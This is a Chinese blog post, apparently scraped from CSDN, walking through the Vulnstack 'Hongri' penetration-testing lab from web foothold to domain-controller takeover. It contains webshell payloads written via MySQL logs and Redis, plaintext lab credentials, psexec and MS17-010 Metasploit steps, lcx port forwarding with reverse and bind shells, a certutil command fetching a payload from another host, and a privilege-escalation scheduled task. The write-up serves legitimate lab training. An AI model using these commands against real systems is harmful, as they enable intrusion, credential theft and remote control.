{"blogid": "123453836", "writerAge": "码龄6年", "writerBlogNum": "24", "writerCollect": "23", "writerComment": "4", "writerFan": "168", "writerGrade": "2级", "writerIntegral": "256", "writerName": "linshao_", "writerProfileAdress": "writer_image\\profile_123453836.jpg", "writerRankTotal": "67302", "writerRankWeekly": "119619", "writerThumb": "9", "writerVisitNum": "13779", "blog_read_count": "1370", "blog_time": "于 2022-03-13 06:05:00 发布", "blog_title": "红日靶场全流程渗透测试", "content": "<div class=\"article_content clearfix\" id=\"article_content\">\n<link href=\"style.css\" rel=\"stylesheet\"/>\n<div class=\"htmledit_views\" id=\"content_views\">\n<p><strong>作者：linshao</strong></p>\n<hr/>\n<p></p>\n<p>靶场下载地址：</p>\n<pre><code>http://vulnstack.qiyuanxuetang.net/vuln/detail/2/</code></pre>\n<p></p>\n<p></p>\n<hr/>\n<h1><strong>目录</strong></h1>\n<p><strong>web-&gt;内网（两条路线：）</strong></p>\n<p> 一.php探针-&gt;mysql弱口令-&gt;目录扫描phpmyadmin-&gt;日志写shell</p>\n<p> 二.目录扫描yxcms.rar-&gt;后台弱口令-&gt;模板写shell</p>\n<p><strong>内网-&gt;域控（三条线路：）</strong></p>\n<p>一.密码抓取-&gt;寻找域控-&gt;psexec登录域控-&gt;get</p>\n<p> 二.主机发现-&gt;漏洞扫描-&gt;域控存在ms17-010-&gt;msf代理攻击-&gt;get</p>\n<p>三.主机发现-&gt;端口扫描-&gt;redis未授权-&gt;getshell-&gt;正向上线msf-&gt;提权-&gt;get</p>\n<hr/>\n<h1></h1>\n<h1><strong>一、web-&gt;内网</strong></h1>\n<p>一.php探针-&gt;mysql弱口令-&gt;目录扫描phpmyadmin-&gt;日志写shell</p>\n<p>1.mysql弱口令：主页尝试root/root数据库连接正常</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\5d18dab05f7ccaaaad6b461b65b935dd.png\"/></p>\n<p>2.目录扫描phpmyadmin：目录扫描存在phpmyadmin</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\d90a08bbfe725b8151b5627d219b68ef.png\"/></p>\n<p>3.日志写shell：</p>\n<p>    文件导出被禁止</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\e578564ab560b7146f0fc47aaa0e5e02.png\"/></p>\n<p>    测试一下确实无法导出</p>\n<p>    select \"test\" into outfile \"C:\\\\www\\\\phpstudy\\\\test.php\"</p>\n<p></p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\191aba474af41da07cb5127f21b6f5a8.png\"/></p>\n<p>    使用日志写shell</p>\n<p></p>\n<p>  //设置日志文件，web绝对路径可以从探针得知</p>\n<p><code>SET GLOBAL general_log_file = \"C:\\phpStudy\\WWW\\1.php\";</code><code>set global general_log='on';      //开启日志</code><code>SELECT '&lt;?php assert($_REQUEST[\"cmd\"]);?&gt;';</code></p>\n<p></p>\n<p></p>\n<p>4.访问成功：</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\c2e62484bd3f4ff28fea917542745ff3.png\"/></p>\n<hr/>\n<p>二.目录扫描yxcms.rar-&gt;后台弱口令-&gt;模板写shell</p>\n<p>1.目录扫描yxcms.rar：</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\0e3d13f86e0619b844ae75073cdbe0ac.png\"/></p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\4c2bde75865271f532b39f1c8d569a41.png\"/></p>\n<p></p>\n<p>2.登录后台，新建模板</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\c80bb44a1359441866f8bfc7c896434f.png\"/></p>\n<p></p>\n<p>3.访问shell,模板文件位置可在本地搭建环境得知</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\04eea0fe6a01e00def5b8ff9e8915f6c.png\"/></p>\n<p></p>\n<hr/>\n<h1></h1>\n<h1 id=\"igXYR\">内网-&gt;域控</h1>\n<p id=\"u801c9047\">先上线cs，powershell上线失败，生成exe上线成功</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\55ae26f6279389769b6feea5bcfcb860.png\"/></p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\096c23f8e6f802d24f92a0605bea3c14.png\"/></p>\n<p>一.密码抓取-&gt;寻找域控-&gt;psexec登录域控</p>\n<p id=\"ude045089\">密码抓取</p>\n<p id=\"ud8cd7fd8\">Administrator/Admin@123</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\0352dacaab52fa36d9cebea0a4c6baeb.png\"/></p>\n<p id=\"ua9faea0d\">开启远程桌面：</p>\n<p id=\"u9acc6e6f\">REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f</p>\n<p id=\"uc5e9a5ce\">netstat -an findstr 3389查看是否开启成功</p>\n<p id=\"u5675abd7\">远程登录成功</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\ff126e197b6874b3d4c37fa236d72274.png\"/></p>\n<p id=\"u8dddf662\">查找域控</p>\n<p id=\"u8c1c707c\">以下几个命令都可以获取到域名</p>\n<p id=\"uaf1f76e5\">systeminfo</p>\n<p id=\"ued914499\">ipconfig /all</p>\n<p id=\"udae87005\">查找域管</p>\n<p id=\"u700b6f74\">net group \"Domain Admins\" /do</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\b8ff69349c64ed2f5ca24b27791e441e.png\"/></p>\n<p id=\"u6c51ca28\">获取域控ip：</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\fed723106ef8956ad9be4d3de546f841.png\"/></p>\n<p id=\"u409cc091\">psexec登录：</p>\n<p id=\"u140f8797\">上传psexec到192.168.1.11执行命令</p>\n<p id=\"u2e598781\">psexec \\\\192.168.52.138 -u Administrator -p Admin@123 -s cmd</p>\n<p id=\"u56849e71\">会回弹一个system权限的cmd回来</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\b274aeadb58f3804c273a26210324fe0.png\"/></p>\n<p id=\"uf0f889c6\">到此最简单的获取域控线路结束</p>\n<p>二. 主机发现-&gt;漏洞扫描-&gt;域控存在ms17-010-&gt;msf代理攻击-&gt;get</p>\n<p id=\"u1b5bf5ff\">主机发现：</p>\n<p id=\"u5a9b4b20\"></p>\n<p id=\"u25e9bb77\">arp-a</p>\n<p id=\"ub780e05f\">存在192.168.52.0/24网段</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\5c6de3516bf39a954c83f2dbeb06f2c0.png\"/></p>\n<p id=\"u3841e5e6\">上传nbtscan（就是快!!!）扫描网段，结果ip放置于1.txt（边界ip为192.168.52.143，排除），DC为...138</p>\n<p id=\"u86c1b2e6\">（实战中可以白天和晚上各扫描一遍来对比）</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\d0cd590a1d2ed1fc60c243b900403401.png\"/></p>\n<p id=\"u00024449\">漏洞扫描：</p>\n<p id=\"ua36fc461\">上传fscan (内网大保健!!!) 扫描1.txt内ip (fscan也可直接扫网段)</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\536029fc750b5585147362986203e54c.png\"/></p>\n<p id=\"uf09e8d30\">根据结果可以看到138和141都存在ms17-010</p>\n<p id=\"u2a790ecd\">msf代理攻击：</p>\n<p id=\"ub18b2ad9\">但是该机器收不到reverce_shell，判断不出网，遂使用cs创建代理隧道</p>\n<p id=\"u9c92a91d\">使用proxychains代理msf对内网进行攻击，</p>\n<p id=\"u6af5abfe\">由于边界机器win7出网，因此使用lcx监听本地端口转发到msf (边界不出网用pystinger，或者reg打通隧道在整)</p>\n<p id=\"ua9f2a303\">如图：</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\8929252d5e00e233a7f68a0bce84eeab.png\"/></p>\n<p id=\"u69a2efd9\">cs创建socks4隧道</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\e8b683080f6fc20394511f5629e67015.png\"/></p>\n<p id=\"ueedcfd36\">kali设置代理：</p>\n<p id=\"ua859739e\">cs所在ip为192.168.1.2</p>\n<p id=\"u9c36c5b6\">刚刚设置的socks代理端口为12345</p>\n<p id=\"u45b2c783\">配置proxychains：</p>\n<p id=\"u371553b8\">kali打开终端，su切换root用户</p>\n<p id=\"ud5c43931\">输入vi /etc/proxychains4.conf</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\dc4c328ab6d7e581a41936c600521c18.png\"/></p>\n<p id=\"u7a07f1ab\">最后一行添加socks4 ip port</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\b0b08ddbaccdcc2b9074b5c28d412a92.png\"/></p>\n<p id=\"u89110a9b\">按esc输入wq!保存</p>\n<p id=\"u14736761\">打开终端输入proxychains firefox访问192.168.52.138:80代理成功</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\3fd5cca347285628dd09e4b7bcd8ff33.png\"/></p>\n<p id=\"udd2606c9\">现在我们可以使用proxychains使msf走代理攻击到192.168.52.138，但是无法获得meterpreter会话，因此下一步使用lcx进行端口转发接收meterpreter</p>\n<p id=\"uf7e3b9d4\"></p>\n<p id=\"ud9f47fec\">win7使用lcx转发</p>\n<p id=\"ucba96797\">上传lcx到win7，执行命令对55555进行监听：lcx -tran 55555 192.168.1.12:4444</p>\n<p id=\"uc5d5f80f\">(命令解释：通过lcx监听本地5555端口，收到数据后转发到192.168.1.12的4444端口，</p>\n<p id=\"u4e40ea72\">因此kali需要设置监听4444来接收shell)</p>\n<p id=\"u5609d4a4\">l</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\4f987e3d302800e334ebfab07ac00ead.png\"/></p>\n<p id=\"u013cee0e\">msf监听4444端口：</p>\n<p id=\"uf0a3bfa1\">kali启动终端，输入：msfconsole启动msf</p>\n<p id=\"u3032a8fc\">use exploit/multi/handler</p>\n<p id=\"ua0e1bfde\">set payload windows/meterpreter/reverse_tcp</p>\n<p id=\"ub502db18\">set lhost 192.168.1.12</p>\n<p id=\"ud824ca43\">set lport 4444</p>\n<p id=\"u4c63e5ef\">run</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\bca60b935a93c1e8387614ff102d09f2.png\"/></p>\n<p id=\"uc97097e0\"></p>\n<p id=\"ud58b15ba\">proxychains代理msf对域控（192.168.52.138）进行ms17-010攻击</p>\n<p id=\"ub8546968\">kali启动终端，输入：proxychains msfconsole启动msf</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\59295b88732f4af42b9fd6ff4a21a434.png\"/></p>\n<p id=\"ueba374b7\">use windows/smb/ms17_010_psexec</p>\n<p id=\"uf25ac50a\">set rhosts 192.168.52.138</p>\n<p id=\"u016d5a8f\">set lhost 192.168.52.143</p>\n<p id=\"ue3bc395f\">set lport 55555</p>\n<p id=\"u04ae8ea0\">run</p>\n<p id=\"u8b28ed67\">攻击完成kali成功获取到会话</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\b093903fa2dfae1a6df5e6c558ec7807.png\"/></p>\n<p id=\"ue4d00f6b\">至此成功获取到域控，另外可再起一个lcx进程端口来接受192.168.52.139(域内一台server2008机器)的会话</p>\n<p id=\"ufa4b0530\">lcx监听55556，同样转发到192.168.1.12的4444</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\2f5da6464b251f00231f1df530d9070d.png\"/></p>\n<p id=\"u51ce955d\">输入：background 把已获取的session放到后台，然后继续监听4444</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\09a4a4c00452da65e0e5f1e44be2057c.png\"/></p>\n<p id=\"uc872ff95\">切换到msf攻击终端去</p>\n<p id=\"u78bf3b24\">set rhosts 192.168.52.139</p>\n<p id=\"u566b7c95\">set lport 55556</p>\n<p id=\"u9f9b8978\">run</p>\n<p id=\"ud80f2293\">可以看到成功以边界机器win7为跳板同时管理域内多台主机的会话，此方法适用于存在边界机器的不出网内网渗透，以及全不出网机器打通隧道的内网渗透</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\edfb61c07e4abffa4518c0d20181709f.png\"/></p>\n<p id=\"ud18286c4\">server2003（192.168.52.141）是x86位系统，因为测试时使用ms17-010的payload打蓝屏了</p>\n<p id=\"ucc627140\">所以我新增加的主机192.168.52.138，方便达到测试效果</p>\n<p id=\"u6a5e51a7\">几个反弹shell的payload都不可成功弹shell回来（包括x86的）</p>\n<p id=\"ubafdda4d\">不过信息安全的男生是绝不会轻易认输的</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\09acbe4dd772c710cfb6660c7b34f43b.png\"/></p>\n<p id=\"ubd5606c0\">再次对192.168.52.141使用nmap漏洞扫描</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\c10c887c4617aa83304e8f0a5d0ccdc9.png\"/></p>\n<p id=\"u3a243eb7\">发现存在ms08-067，再次使用msf进行测试，不过，又失败了。应该是payload的原因，两个漏洞都是接收shell哪儿是有反应的，但meterpreter会话不可用。</p>\n<p id=\"uc31faf4c\">渗透本就是逆天而行，死在路上也很正常</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\09acbe4dd772c710cfb6660c7b34f43b.png\"/></p>\n<p id=\"u1d65c699\">经过反复测试</p>\n<p id=\"ua4114f64\">admin/smb/ms17_010_command模块是可以成功执行命令的（多执行几次，有时候会失效）</p>\n<p id=\"ub2f1795f\">可以通过</p>\n<p id=\"u8c662af8\">use admin/smb/ms17_010_command</p>\n<p id=\"ue4376e35\">set command 'REG ADD HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal\" \"Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f'</p>\n<p id=\"ueabbc121\">set rhosts 192.168.52.141</p>\n<p id=\"u91cf9397\">run</p>\n<p id=\"u5e411544\">来开启server2008的远程端口，再通过域管账户登录上去</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\6d0b8fae10859276c4483e7ff0b33b08.png\"/></p>\n<p id=\"ucbae7c15\">至此，域内机器已全部get</p>\n<p>三.主机发现-&gt;端口扫描-&gt;redis未授权-&gt;getshell-&gt;正向上线msf-&gt;提权-&gt;get</p>\n<p id=\"u23f0d870\">主机发现：</p>\n<p id=\"u54d04130\">沿用以上获取到的ip</p>\n<p id=\"ufe64dea2\">端口扫描：</p>\n<p id=\"u9065a129\">使用fscan批量扫描网段6379：得知192.168.52.138上开放redis端口</p>\n<p id=\"u4c77b2ea\">且其开放80端口为iis，可尝试redis写webshell</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\976ad1c0b7add6e5c03c6243a7c29d1d.png\"/></p>\n<p id=\"u5933116b\">redis未授权：</p>\n<p id=\"u0c3dc15a\">上传redis-cli.exe到边界服务器win7上（也可以不上传，流量走代理）</p>\n<p id=\"uc4a5c365\">执行redis-cli.exe -h 192.168.52.138 -p 6379</p>\n<p id=\"ufb7701f9\">发现redis存在未授权，尝试写出asp一句话</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\9d6def6e1fb2e46ab02e0143879d24cb.png\"/></p>\n<p id=\"u2735d199\">getshell：</p>\n<p id=\"uc04e5c8d\">尝试访问成功</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\93ea378e20fcbfe8fa3edc8ac55bc6cb.png\"/></p>\n<p id=\"ua267ceb7\">当前权限iis</p>\n<p id=\"u258172eb\"><a href=\"http://192.168.52.138/test.asp?linshao=response.write%28server.createobject%28\" title='http://192.168.52.138/test.asp?linshao=response.write(server.createobject(\"wscript.shell\").exec(\"cmd.exe'>http://192.168.52.138/test.asp?linshao=response.write(server.createobject(\"wscript.shell\").exec(\"cmd.exe</a> /c whoami\").stdout.readall)</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\380ad07e42ff317dbe720f6af6544f32.png\"/></p>\n<p id=\"uce592585\">正向连接上线msf：</p>\n<p id=\"u709f98db\">由于不出网，使用msf生成木马通过代理正向连接</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\d312848104d1705b5d3ccee04be6d8f4.png\"/></p>\n<p id=\"u54cdad5f\">上传bind.exe到win7</p>\n<p id=\"uf1f49ff3\">上传hfs.exe简易http服务器到win7搭建http服务（点开即用，方便极了）</p>\n<p id=\"u93634958\">访问连接通过执行certutil命令下载木马到c:\\windows\\temp\\</p>\n<p id=\"u82a81b5f\">(%26为&amp;，命令连接符)</p>\n<p id=\"u83c6bdd4\"><a href=\"http://192.168.52.138/test.asp?linshao=response.write%28server.createobject%28\" title='http://192.168.52.138/test.asp?linshao=response.write(server.createobject(\"wscript.shell\").exec(\"cmd'>http://192.168.52.138/test.asp?linshao=response.write(server.createobject(\"wscript.shell\").exec(\"cmd</a> /c cd C:\\Windows\\Temp %26 certutil -urlcache -split -f <a href=\"http://192.168.52.143/bind.exe\" title='http://192.168.52.143/bind.exe\").stdout.readall)'>http://192.168.52.143/bind.exe\").stdout.readall)</a></p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\0ec6ec2c57ad0ef2ddcb74a9e966a530.png\"/></p>\n<p id=\"ua76dc6bc\">访问链接执行bind.exe</p>\n<p id=\"ue8a86d43\"><a href=\"http://192.168.52.138/test.asp?linshao=response.write%28server.createobject%28\" title='http://192.168.52.138/test.asp?linshao=response.write(server.createobject(\"wscript.shell\").exec(\"cmd'>http://192.168.52.138/test.asp?linshao=response.write(server.createobject(\"wscript.shell\").exec(\"cmd</a> /c C:\\Windows\\Temp\\ind.exe\").stdout.readall)</p>\n<p id=\"u4f38e618\">执行后目标已开放4444端口：</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\12cb5d4a9b5c063842cba1a4e399bbc7.png\"/></p>\n<p id=\"u0fbcec65\">注意：bind_tcp的端口对于其他程序来说是一次性的，也就是说不能扫描，否则bind.exe接收到的数据异常会导致程序崩溃。上图我扫描端口就引起了程序崩溃。重新访问启动木马，访问时候看到速度比较慢则启动木马成功</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\d6379c200c8b15fd46c4006037e71465.png\"/></p>\n<p id=\"u0fbcec65\">使用代理的msf进行连接：</p>\n<p id=\"u94d17f04\">use exploit/multi/handler</p>\n<p id=\"ue2fd2bfb\">set payload windows/x64/meterpreter/bind_tcp</p>\n<p id=\"ub617d5d9\">set rhost 192.168.52.138</p>\n<p id=\"ub217719e\">set lport 4444</p>\n<p id=\"u5cc9c85b\">run</p>\n<p id=\"u90977156\">运行后通过代理连接到域控的4444端口，但是权限特别低（iis权限），下一步进行提权</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\695bd3ce9cd4f2780103929c08150bde.png\"/></p>\n<p id=\"u2c8756f7\">提权：cve2018-8210提权</p>\n<p id=\"u723b16ca\">sysinfo查看得知系统为2008r2，使用cve2018-8210提权（08系统的提权漏洞挺多的）</p>\n<p id=\"u2095bf9c\">#msf上传文件：</p>\n<p id=\"u3e095ad0\">upload x64.exe c:\\\\windows\\\\temp\\\\x64.exe</p>\n<p id=\"uef72676c\">#添加计划任务重新运行bind.exe:</p>\n<p id=\"u7f42b8a2\">execute -f 'cmd /c at 9:29 c:\\\\windows\\\\temp\\\\x64.exe \"c:\\\\windows\\\\temp\\\\bind.exe\"'</p>\n<p id=\"u18860e67\">#退出当前会话，</p>\n<p id=\"u49eaa389\">exit</p>\n<p id=\"uddc35221\">#等待定时任务执行完毕后再次run</p>\n<p id=\"u064195bb\">run</p>\n<p id=\"u77839589\">成功获取到system权限</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\3fa7e8070fbc3e9a32804075eebe6f29.png\"/></p>\n<p id=\"u5f350af6\">TIPS:bind_tcp的会话还是比较不爽的，执行命令只能通过execute -f \"whoami\"执行，不过这里应该是我有层代理的原因。不是直连的所以会无法获取交互式shell</p>\n<hr/>\n<p></p>\n<p>'一闪一闪亮晶晶，满天都是小星星’</p>\n<p style=\"text-align:center;\"><img alt=\"\" src=\"image\\48dde842ecf3bdc1fd9ea328391e96d2.png\"/></p>\n</div>\n</div>"}